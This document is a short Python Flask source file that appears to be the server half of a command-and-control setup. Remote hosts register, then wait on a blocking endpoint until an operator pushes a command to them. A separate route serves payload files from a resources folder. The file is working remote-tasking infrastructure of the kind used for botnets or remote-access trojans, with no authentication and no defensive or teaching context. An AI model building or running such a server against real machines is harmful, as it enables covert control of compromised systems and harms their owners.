from flask import Flask, request, send_file, render_template
import os, time
import requests
import threading

app = Flask(__name__)

hosts = {}


@app.route('/handshake', methods = ['POST'])
def handshake():
  global hosts
  key = (request.remote_addr, request.form['name'])
  hosts[key] = {'lock' : threading.Lock(), 'command' : ''}
  hosts[key]['lock'].acquire()
  return 'Request accepted' 

@app.route('/')
def displayHosts():
  global hosts
  keys = hosts.keys()
  return render_template('index.html', keys = keys)

@app.route('/download/<file>')
def download(file):
  path = './resources/' + file
  if os.path.exists(path):
    return send_file(path, as_attachment = True)
  else:
    return "File not found", 404

@app.route('/ready', methods = ['POST'])
def timeout():
  global hosts
  key = (request.remote_addr, request.form['name'])
  hosts[key]['lock'].acquire()
  return hosts[key]['command']

@app.route('/send', methods = ['GET'])
def send_form():
  global hosts
  name = request.args.get('name')
  ip = request.args.get('ip')
  return render_template('form.html', name = name, ip = ip)

@app.route('/send', methods = ['POST'])
def send_process  ():
  global hosts
  name = request.args.get('name')
  ip = request.args.get('ip')
  key = (ip, name)
  hosts[key]['command'] = request.form['command']
  if hosts[key]['lock'].locked():
    hosts[key]['lock'].release()
  else:
    return 'Host offline'
  return render_template('form.html', name = name, ip = ip)